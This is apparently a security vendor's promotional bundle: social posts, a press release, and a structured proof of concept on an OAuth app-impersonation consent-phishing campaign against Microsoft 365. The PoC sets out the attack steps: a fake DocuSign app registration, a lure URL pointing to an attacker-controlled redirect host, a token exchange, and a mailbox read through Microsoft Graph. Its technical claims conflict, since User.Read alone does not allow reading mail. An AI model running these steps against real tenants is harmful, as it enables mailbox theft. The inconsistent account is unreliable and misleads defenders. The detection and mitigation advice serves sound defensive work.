## LinkedIn Post

Your multi-factor authentication works perfectly. Your conditional access policies are fully deployed. Yet an adversary is currently indexing your corporate mailbox via the Microsoft Graph API—and your security operations center hasn't logged a single alert.

Welcome to the reality of the ShadowVanguard campaign.

Over the past year, threat actors weaponizing toolkits like Tycoon PaaS and ODx have targeted more than 900 corporate tenants, achieving compromise rates exceeding 50%. Their technique? Weaponizing OAuth app impersonation in Microsoft 365.

Here is how the threat functions:
1. The user receives a spear-phishing lure masquerading as a routine DocuSign agreement, Adobe Acrobat document, or SharePoint invite.
2. The link sends the user to the genuine Microsoft login portal (login.microsoftonline.com). Secure Email Gateways and URL scanners see legitimate Microsoft infrastructure and clear it.
3. The rogue multi-tenant application requests non-admin scopes (`User.Read`, `offline_access`). Because default Entra ID settings permit user-level consent, the user clicks 'Accept'.
4. An Adversary-in-the-Middle (AiTM) proxy captures the authorization code, negotiates a long-lived OAuth refresh token, and establishes persistent access outside the user's browser.

Here is the critical failure point: resetting the victim's corporate password DOES NOT invalidate delegated OAuth refresh tokens. The adversary continues to monitor emails, set mailbox forwarding rules, and map tenant directories silently.

If you are a CISO, identity architect, or SecOps leader, take immediate action:
- Disable standard user consent for third-party multi-tenant applications in Entra ID.
- Require strict Admin Consent Workflows with MPN publisher verification.
- Implement FIDO2 phishing-resistant MFA to neutralize AiTM reverse proxies.
- Audit Entra audit logs for 'Consent to application' and 'Add delegated permission grant' operations.

Read our exhaustive technical brief and grab the complete PowerShell remediation script: https://breachmodal.com/research/shadowvanguard-oauth-impersonation

## X Thread

1. 1/7 If you think an MFA prompt and a password reset protect your Microsoft 365 environment, the ShadowVanguard campaign proved you wrong. Here is how adversaries weaponize OAuth app impersonation to establish invisible persistence in Entra ID: 🧵👇

2. 2/7 The attack bypasses Secure Email Gateways entirely. Why? The lure directs users to legitimate Microsoft authentication infrastructure: https://login.microsoftonline.com. Zero reputation flags. Zero domain alerts.

3. 3/7 The rogue application impersonates corporate staples: DocuSign, Adobe Acrobat Sign, SharePoint. It asks for basic, non-admin permissions: User.Read, offline_access. Under default Entra ID settings, standard users are allowed to consent.

4. 4/7 Using AiTM reverse proxies like Tycoon PaaS, attackers capture authorization codes and negotiate persistent OAuth refresh tokens. They never need the user's password again.

5. 5/7 Note what this means: Resetting the compromised user's password DOES NOT kill the adversary's OAuth access. The token remains active, allowing continuous data theft via the Microsoft Graph API.

6. 6/7 Mitigation checklist for SecOps:
- Disable user consent in Entra ID
- Require admin approval for all multi-tenant apps
- Transition to FIDO2 phishing-resistant MFA
- Query Entra audit logs for 'Consent to application' events

7. 7/7 Full technical analysis, Proof of Concept walkthrough, and PowerShell incident response scripts available now on BreachModal Intelligence: https://breachmodal.com/research/shadowvanguard-oauth-impersonation

## Visual Brief

### Hero Image Concept
Cinematic visual featuring a glowing Microsoft Entra ID directory tree fracturing under a dark glass shield, with illuminated red token streams siphoning outward into a rogue application node. Dark cyberpunk aesthetic with cool blue and stark red lighting.

### Infographic Concept
Anatomy of an Identity Breach: A step-by-step executive infographic detailing how the ShadowVanguard campaign achieves persistence across Microsoft 365 environments without deploying malware or tripping EDR sensors.

### LinkedIn Carousel
- Slide 1: Why Password Resets Won't Stop the ShadowVanguard Campaign.
- Slide 2: The Attack Surface: How OAuth App Impersonation Abuses Microsoft 365 User Consent.
- Slide 3: The AiTM Trap: How Tycoon PaaS Converts Legitimate Microsoft Logins into Persistent Access.
- Slide 4: The 4 Signs of Rogue Service Principals in Your Entra ID Audit Logs.
- Slide 5: Actionable Defense: 3 Configurations Every CISO Must Enforce in Entra ID Today.

### Short-form Video Script
Think changing your password stops cloud hackers? Think again. In the ShadowVanguard campaign, attackers don't steal passwords—they trick users into granting OAuth app permissions disguised as DocuSign or SharePoint. Once granted, an OAuth refresh token gives them full Microsoft Graph access even after a password reset. Stop user consent in Entra ID today. Protect your enterprise with BreachModal.

## Press Release

NEW YORK — BreachModal, the global leader in adversarial simulation and cloud breach response, has released an intelligence report detailing the mechanics of the ShadowVanguard campaign. The ongoing threat cluster weaponizes OAuth application impersonation and rogue consent flows within Microsoft 365 and Entra ID environments, successfully compromising over 900 enterprise tenants. By abusing default user consent configurations and deploying Adversary-in-the-Middle (AiTM) frameworks, attackers establish persistent access that survives routine password resets. BreachModal urges enterprise CISOs to immediately restrict user consent capabilities and adopt phishing-resistant authentication controls. The complete technical briefing and open-source detection signatures are available on BreachModal.com.

## Proof of Concept (Structured)

**Summary**: This PoC demonstrates the end-to-end weaponization of OAuth app impersonation in Microsoft Entra ID. It shows how an adversary configures a multi-tenant application, baits a victim into granting delegated consent via genuine Microsoft login URLs, converts authorization codes into long-lived refresh tokens, and extracts cloud data via Microsoft Graph API without triggering standard endpoint alerts.

**CVSS v3.1**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

**Steps**:

### Step 1: Multi-Tenant Application Setup
```
{
  "appId": "d3b07384-d113-4c91-9c3a-9f829f03112a",
  "displayName": "DocuSign Document Signature Portal",
  "signInAudience": "AzureADMultipleOrgs",
  "replyUrlsWithType": [{"url": "https://contract-auth.secure-verify-hub.com/callback", "type": "Web"}],
  "requiredResourceAccess": [{"resourceAppId": "00000003-0000-0000-c000-000000000000", "resourceAccess": [{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}]}]
}
```
Registers an external multi-tenant application mirroring trusted enterprise brand names with legitimate Microsoft Graph permissions.

### Step 2: Consent Lure Generation
```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=d3b07384-d113-4c91-9c3a-9f829f03112a&response_type=code&redirect_uri=https%3A%2F%2Fcontract-auth.secure-verify-hub.com%2Fcallback&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2FUser.Read%20offline_access&state=auth-sess-9281
```
Constructs the authorization URL utilizing Microsoft's genuine domain, bypassing email security gateway filters.

### Step 3: Token Acquisition
```
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d 'client_id=d3b07384-d113-4c91-9c3a-9f829f03112a' \
  -d 'client_secret=ATTACKER_SECRET' \
  -d 'grant_type=authorization_code' \
  -d 'code=AUTHORIZATION_CODE_RETURNED' \
  -d 'redirect_uri=https://contract-auth.secure-verify-hub.com/callback'
```
Exchanges the victim's granted authorization code for an OAuth Access Token and persistent Refresh Token.

### Step 4: API Exploitation
```
curl -X GET "https://graph.microsoft.com/v1.0/me/messages?$select=subject,sender,bodyPreview" \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```
Performs programmatic exfiltration of mailbox communications via Microsoft Graph API without endpoint detection.

### Step 5: Remediation and Revocation
```
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"
Revoke-MgUserSignInSession -UserId "<VICTIM_USER_ID>"
Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId "<GRANT_ID>"
```
Revokes active refresh tokens and unbinds delegated OAuth permissions using Microsoft Graph PowerShell.

**Expected Output**: HTTP/1.1 200 OK containing valid JSON response with access_token, refresh_token, and expiresIn parameters, followed by unrestricted extraction of mailbox metadata via Microsoft Graph.

**Mitigations**:
- Disable user consent: Navigate to Entra ID > Enterprise applications > Consent and permissions, and enforce 'Do not allow user consent'.
- Configure an Admin Consent Workflow requiring IT review for any application requesting permissions from unverified publishers.
- Enforce FIDO2 / WebAuthn phishing-resistant authentication via Conditional Access to defeat Adversary-in-the-Middle (AiTM) proxies.
- Enable Continuous Access Evaluation (CAE) to revoke refresh tokens immediately upon suspicious network location or risk posture changes.
- Deploy detection rules monitoring Entra Audit Logs for 'Consent to application' and 'Add delegated permission grant' events.

